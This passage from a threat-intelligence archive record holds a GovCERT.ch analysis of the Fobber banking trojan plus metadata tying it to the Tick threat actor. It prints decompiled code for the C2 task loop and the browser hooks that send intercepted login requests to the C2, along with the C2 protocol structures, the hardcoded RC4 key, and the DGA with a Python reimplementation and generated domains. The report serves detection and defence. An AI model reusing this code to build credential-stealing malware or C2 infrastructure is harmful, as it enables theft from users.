clientDataToServer_5bytes.sendFunctionSelector = sendFunctionSelector;\n  threadHandle = (void\n    *)prepeare_payload_and_send_with_thread(&clientDataToServer_5bytes.field_0,\n    5u, 0);\n  WaitForSingleObject(threadHandle, 1200000u);// 20 minutes time to\n    succesfully connect to a c2\n  do\n  {\n   if ( pendingTask_1exeNemre_3codeKtxSdd == 1 )// probably update\n     (nemre.exe)\n   {\n    start_process_nemre_exe();\n    Sleep(0xFFFFFFFF);\n   }\n   else if ( pendingTask_1exeNemre_3codeKtxSdd == 3 )// ktx.sdd\n   {\n    decrypted11_executeKtxSddAsCode(injectionIndicator);\n   }\n   tsNow = GetTickCount();\n   tsPreviousSignal = tsLastSignal;\n   tsLastSignal = tsNow;\n   diffTicks = tsNow - tsPreviousSignal;\n   if ( diffTicks >= 1200000 ) // 20 minutes\n    break;\n   remainsUntil20Minutes = -(diffTicks - 1200000);\n   tsLastSignal += remainsUntil20Minutes;\n  }\n  while ( !WaitForSingleObject(evtExecute, remainsUntil20Minutes) );//\n    leaves if \"in average\" more than 20 monutes passed between 2 events\n\n```\nThe network request contains just 5 bytes:\n```\n00000000 clientDataToServerStruct struc ; (sizeof=0x5, mappedto_46)\n00000000 constValue50h db ?\n00000001 constValue4Ch db ?\n00000002 is64bits db ?\n00000003 injectionIndicator db ?\n00000004 sendFunctionSelector db ?\n00000005 clientDataToServerStruct ends\n\n```\nFor a description of the fields please refer to Communication Protocol section.\n\nFOBBER ANALYSIS 18\n\n\n-----\n\nGovCERT.ch TLP WHITE\n\nThe pendingTask flag is set by the C2 response processing function and determines which\naction to be executed.\nThe explorer shellcode is responsible to handle:\n\n  - Value 1: start the nemre executable (after received an updated version from C2)\n\n  - Value 3: execute the content of ktx.sdd file directly (contains binary code)\n\n## Browser shellcode\n\nThe browser injected shellcode will perform three main things.\n\n1. Try to unload the rapportgp.dll if loaded (IBM Security Trusteer Rapport)\n2. Hook API used by browser to intercept data sent via HTTP/S (wininet, nss, ssl)\n3. Monitor for config changes, and if any, reload the config in memory\n\n**Hooking**\n\n  - Hooking for IE explorer is done for the following wininet APIs: HttpSendRequest,\n```\n   InternetCloseHandle\n\n```\n  - Hooking for FireFox is done for two functions (equally to send/close) either in NSPR4\nor NSS dlls.\n\n  - Hooking in Chrome is done for four functions (equally to send/close), two internal of\nchrome itself and two are part of the ssl_lib.c (linked into Chrome)\n```\nswitch ( (_BYTE)browserIndex_1ie_2ff_3chrome )\n{\n case 1: // IE\n  decrypted39_setupHttpSendAndCloseHooks();\n  break;\n case 2: // FF\n  firefoxHooking();\n  break;\n case 3: // Chrome\n  chromeHooking();\n  chromeHookingSsl();\n  break;\n}\nhookEnabled = 1;\n\n```\nOnce a (send) payload is intercepted by the hook function, the malware will first check if\nthe request is either a POST or a GET (other methods are not processed), then it\nloads the request in memory and perform some analysis with it:\n\n  - Checks, if any cookie matches the Cookie: *OAID pattern; if so, sends the data to the\nC2 server with payload type 4\nFor example when visiting www.responsible-investor.com (which uses OAID cookie)\nall the requests involving the cookie are sent to the server:\n\nFOBBER ANALYSIS 19\n\n\n-----\n\nGovCERT.ch TLP WHITE\n```\n   GET / HTTP/1.1\n   Host: www.responsible-investor.com\n   User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:37.0) Gecko/20100101 Firefox/37.0\n   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n   Accept-Language: en-US,en;q=0.5\n   Accept-Encoding: gzip, deflate\n   Cookie: OAID=052681046a449e0d8dc8844c3d02b99b; ....\n   Connection: keep-alive\n   If-Modified-Since: Tue, 01 Sep 2015 06:10:04 GMT\n\n```\nThe OAID cookie is mostly used to manage which ads are shown to which user. The\nattacker could potentially use the cookie ID together with some vulnerability of the\nOpenX platform to manipulate which ads are served to the infected client. (its just a\nguess)\n\n  - Checks if the request contains any data that matches a configuration entry (e.g. default\nconfig, see Storage); if so, sends the data to the C2 with payload type 2\nIf we try to login into twitter.com, the following request is being sent to the C2 server:\n```\n   POST /sessions HTTP/1.1\n   Host: twitter.com\n   User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:37.0) Gecko/20100101 Firefox/37.0\n   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n   Accept-Language: en-US,en;q=0.5\n   Accept-Encoding: gzip, deflate\n   Referer: https://twitter.com/\n   Cookie: guest_id=v1%3A144110315813991484; _twitter_sess=BAh7C......\n   Connection: keep-alive\n   Content-Type: application/x-www-form-urlencoded\n   Content-Length: 192\n   session%5Busername_or_email%5D=test&session%5Bpassword%5D=test&...\n\n```\nOnce the connection is closed (i.e. the InternetCloseHandle hook is triggered), the malware\nwill free the entry for the request that he previously loaded in memory.\n\n**Monitor configuration changes**\n\nOne thread will be used to wait for changes in the malware directory.\n```\n while ( 1 )\n {\n  decrypted58_loadConfiguration();\n  handleNotificationChange =\n    (int)FindFirstChangeNotificationA(&fobberDirectoryPath, 0, 0x19u);//\n    FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_SIZE |\n    FILE_NOTIFY_CHANGE_LAST_WRITE\n  if ( handleNotificationChange == -1 )\n   break;\n\n```\nFOBBER ANALYSIS 20\n\n\n-----\n\nGovCERT.ch TLP WHITE\n```\n  handleNotificationChange2 = (void *)handleNotificationChange;\n  WaitForSingleObject((HANDLE)handleNotificationChange, 0xFFFFFFFF);// Wait\n    for some changes in the malware directory\n  FindCloseChangeNotification(handleNotificationChange2);\n  Sleep(1000u); // 1 sec\n }\n\n```\nEach time a new config file is retrieved by the malware, it will be decrypted and loaded in\nmemory.\n\n## Storage\n\nThe malware creates a Fobber %APPDIR% directory and put all its file in it.\n\nWe identified three different file types that are written by the malware in this directory:\n\n1. nemre.exe which is the main malware binary, also pointed by auto-start registry key\n2. mlc.dfw which happens to be an encrypted configuration file used by the malware.\nThe configuration file is encrypted using RC4 and a hardcoded key 9SsTuUknCWB1k0R.\n3. ktx.sdd contains executable code (encrypted) that is executed by the explorer-injected\nthread\n\n**Configuration Storage**\n\nThe configuration is stored in a data structure like this:\n```\n- 0 (1 byte): number of blobs (_n_)\n- 1+: sequence of _n_ blobs, each consisting of:\n - _x_ (1 byte): blob ID\n - _x+1_ (4 bytes): blob length (_l_)\n - _x+5_ (_l_ bytes): blob payload\n\n```\nOr graphically:\n\nThis data structure is RC4 encrypted (using the same key) and prefixed by a 32 bit value\ncontaining the total length (this value is not visible in the dump below because it’s outside\nthe encrypted part).\n\nThe default config is included (encrypted) in the binary. In our analysed sample, the decrypted configuration had just one blob (01) with ID 00 and size 0x102 (02 01 00 00):\n\nFOBBER ANALYSIS 21\n\n\n-----\n\nGovCERT.ch TLP WHITE\n```\n00000020 01 00 02 01 00 00 50 20 68 74 74 70 | ......P http|\n00000030 73 3a 2f 2f 2a 00 21 47 50 20 2a 6d 69 63 72 6f |s://*.!GP *micro|\n00000040 73 6f 66 74 2e 2a 00 21 47 50 20 2a 67 6f 6f 67 |soft.*.!GP *goog|\n00000050 6c 65 2e 2a 00 50 20 2a 61 63 63 6f 75 6e 74 73 |le.*.P *accounts|\n00000060 2e 67 6f 6f 67 6c 65 2e 2a 2f 53 65 72 76 69 63 |.google.*/Servic|\n00000070 65 4c 6f 67 69 6e 41 75 74 68 2a 00 21 47 50 20 |eLoginAuth*.!GP |\n00000080 2a 66 61 63 65 62 6f 6f 6b 2e 2a 00 50 20 2a 66 |*facebook.*.P *f|\n00000090 61 63 65 62 6f 6f 6b 2e 2a 2f 6c 6f 67 69 6e 2e |acebook.*/login.|\n000000a0 70 68 70 2a 00 21 47 50 20 2a 6f 6e 6c 69 6e 65 |php*.!GP *online|\n000000b0 63 68 61 74 2e 67 6d 78 2e 2a 00 50 20 2a 73 65 |chat.gmx.*.P *se|\n000000c0 72 76 69 63 65 2e 67 6d 78 2e 2a 2f 63 67 69 2f |rvice.gmx.*/cgi/|\n000000d0 6c 6f 67 69 6e 2a 00 21 47 50 20 68 74 74 70 73 |login*.!GP https|\n000000e0 3a 2f 2f 2a 2e 67 61 74 65 77 61 79 2e 6d 65 73 |://*.gateway.mes|\n000000f0 73 65 6e 67 65 72 2e 6c 69 76 65 2e 63 6f 6d 2a |senger.live.com*|\n00000100 00 21 47 50 20 2a 74 77 69 74 74 65 72 2e 63 6f |.!GP *twitter.co|\n00000110 6d 2a 00 50 20 2a 74 77 69 74 74 65 72 2e 63 6f |m*.P *twitter.co|\n00000120 6d 2f 73 65 73 73 69 6f 6e 73 2a 00 |m/sessions*. |\n\n```\nIf a new configuration file is downloaded, this will be loaded in memory by all the browserinjected threads.\n\n## Communication Protocol\n\n**Send**\n\nHow the data is sent depends on which injection stage generated it.\n\n**Explorer.exe** From the explorer injected shellcode we saw the following structure being\nused:\n```\nstruct SendNetworkProtocolStruct{\n  BYTE constValue50 = 0x50;\n  BYTE constValue4C = 0x4c;\n  BYTE is64bits;\n  BYTE injectionIndicator;\n  BYTE sendFunctionSelector;\n}\n\n```\nThe first two fields have fixed values (actually the letters “PL”, probably a magic number\nto identify the malware version/campaign), the other ones are populated before the request\nis sent and include:\n\n  - If the infected client runs a 64 bits OS\n\n  - The injectionIndicator identify from which injection stage the payload is sent (explorer, chrome, …)\n\n  - The sendFunctionSelector identify which function is used to send/receive data (winhttp or socket)\n\nFOBBER ANALYSIS 22\n\n\n-----\n\nGovCERT.ch TLP WHITE\n\n**Browser** From the browser injected shellcode, the following structure is used:\n```\nstruct SendNetworkProtocolStruct {\n   DWORD lengthWithoutThisField;\n   DWORD volumeSerialNumber;\n   DWORD installDate;\n   BYTE payloadType;\n   DWORD payloadLength;\n   BYTE[] payload;\n};\n\n```\nThe payload field is encrypted using RC4 with an hardcoded key 9SsTuUknCWB1k0R - identical to the one used to encrypt the configuration file:\n\n**Payload Type Values** This field defines whats inside in the payload field, we saw the\nfollowing values:\n\n  - 0: Used for ‘OK’ and ‘ER’ msg (after a task is processed)\n\n  - 2: HTTP/S request matched configuration\n\n  - 4: HTTP/S request matched Cookie: *OAID pattern\n\n  - 8: Used for the ‘EM’ payload when in “low integrity mode”\n\n**Receive**\n\nWhen receiving data from the C2 server, the following structure is used:\n```\nstruct ReceiveNetworkProtocolStruct {\n   DWORD payloadLength;\n   BYTE payloadType;\n   BYTE[] payload;\n};\n\n```\nThe accepted payloadType values are:\n\n  - 1) nemre.exe (malware update)\n\n  - 2) mlc.dfw (config update)\n\n  - 3) ktx.sdd (code to execute)\n\n  - 4) not yet analysed (execute exe/code somehow)\n\nThe received payload contains a signature (hash) verified by the malware to avoid tampering/takeover.\n```\nstruct ReceivedPayloadStruct{\n  DWORD signatureLength;\n  BYTE[signatureLength] signature;\n\n```\nFOBBER ANALYSIS 23\n\n\n-----\n\nGovCERT.ch TLP WHITE\n```\n  BYTE[] payloadData;\n}\n\n```\nThe signature is validated using CryptVerifySignatureA API.\nThe public key used for validating the signature is stored (encrypted once more with the\nsame RC4 key) within the binary:\n```\n00000000 06 02 00 00 00 24 00 00 52 53 41 31 00 04 00 00 |.....$..RSA1....|\n00000010 01 00 01 00 07 da e8 1b 4c 16 87 a7 e2 79 e8 bc |........L....y..|\n00000020 0e d7 ed e6 8c 87 8c e7 c0 57 ab 01 46 0b af 0f |.........W..F...|\n00000030 ac 28 f0 be f6 6a b3 d2 f0 6e 8b eb de 01 6a f4 |.(...j...n....j.|\n00000040 f5 ba ae cc e3 4e 2f 61 a8 1f 14 e2 e2 2b c2 4b |.....N/a.....+.K|\n00000050 58 07 14 b3 2c f0 e6 1f d8 ca a0 f8 44 0a 0a f5 |X...,.......D...|\n00000060 16 8f 3f d8 af 63 7e c4 3f fc c0 14 fb 24 dc 38 |..?..c~.?....$.8|\n00000070 e9 1d ae d0 da 82 6b fa 68 78 e1 dd fe 5d d7 9a |......k.hx...]..|\n00000080 5e 8c f8 24 19 dc 55 c1 ec 97 53 b5 b0 e4 f4 e9 |^..$..U...S.....|\n00000090 52 f1 22 c2 |R.\".|\n\n```\n**DGA**\n\nThe DGA algorithm used by Fobber is pretty straightforward. Let’s see how the domains\nare generated:\n```\nint __stdcall dga_generateDomain(_BYTE *dgaNameOut, int dgaSeed)\n{\n _BYTE *dgaNameOut2; // edi@1\n signed int count; // ecx@1\n int result; // eax@2\n dgaNameOut2 = dgaNameOut;\n count = 17;\n do\n {\n  result = __ROR4__(0x4E68F * dgaSeed - 0x667C0B56, 0x10);\n  dgaSeed = result;\n  *dgaNameOut2++ = (result & 0x17FFu) % 0x1A + 'a';\n  --count;\n }\n while ( count );\n decryptString(a_net, dgaNameOut2); // concat .net to the\n   generated domain\n return result;\n}\n\n```\nIn our sample the DGA seed started with value 0x0C87C8A78.\nThe algorithm generates a maximum of 300 unique domains and keep track of the last seed\nthat generated an active domain.\n\nScripting it with with Python will result in the following code:\n\nFOBBER ANALYSIS 24\n\n\n-----\n\nGovCERT.ch TLP WHITE\n```\ndef generate_domain(local_seed):\n  res_domain = \"\"\n  pass_count = 17\n  while pass_count:\n    tmp = ror(0x4E68F * local_seed - 0x667C0B56, 0x10, 32)\n    local_seed = tmp\n    res_domain += chr((tmp & 0x17FF) % 0x1A + 0x61)\n    pass_count -= 1\n  res_domain += \".net\"\n  return res_domain, local_seed\nwhile True:\n  domain, seed = generate_domain(seed)\n  print domain\n  if count > 300:\n    break\n\n```\n```\ncount += 1\n\n```\n\nThe list of generated domains is the following (only the first entries):\n```\nvhkintjtksyxgjrzz.net\nbtpnxlsfdqbhzazyx.net\nukfmknjdenthvktgc.net\nqupxsrhrmuoinqrit.net\ngjsbydmrpfzsmnfiu.net\nindpstqbetcpcqprx.net\ngwrdmhyjfcpcutmhp.net\nbwnzcyypcbmnlpfsw.net\ntwkpwfuecvvzcincq.net\npdwfuxgnahmgsxhit.net\njyalcixnmcjafecuk.net\nocwhgfvoqhkdsrtjl.net\nwfzuuinpiteusxqfo.net\nxgsqljmoypxbflety.net\nbnxnjmsuhiyvoclzi.net\n...\n\n```\n**HTTP Send/Receive function selection**\n\nFobber includes two way to reach the C2 server.\nOne is by using wininet APIs, the other is by using winsocks.\n```\nseg001:003C4AD4 0C 12 A5 6B socketFunctionOffset dd 6BA5120Ch\n  ; send_read_socket\nseg001:003C4AD8 2D 19 A5 6B winhttpFunctionOffset dd 6BA5192Dh\n  ; send_read_winhttp\n\n```\nFOBBER ANALYSIS 25\n\n\n-----\n\nGovCERT.ch TLP WHITE\n```\nseg001:003C4ADC 0C 12 A5 6B socketFunctionOffset_ dd 6BA5120Ch\n  ; send_read_socket\n\n```\nAlthough there are two different send/receive functions, they both connect to the C2 on\nport 80 and using the HTTP protocol.\n\nFOBBER ANALYSIS 26\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.govcert.admin.ch/downloads/whitepapers/govcertch_fobber_analysis.pdf",
        "http://www.govcert.admin.ch/downloads/whitepapers/govcertch_fobber_analysis.pdf"
    ],
    "report_names": [
        "govcertch_fobber_analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716495,
    "ts_updated_at": 1743041118,
    "ts_creation_date": 1441705181,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/7d057d90b0e84a59c984a0a6efb927dde5a1f875.pdf",
        "text": "https://archive.orkl.eu/7d057d90b0e84a59c984a0a6efb927dde5a1f875.txt",
        "img": "https://archive.orkl.eu/7d057d90b0e84a59c984a0a6efb927dde5a1f875.jpg"
    }
}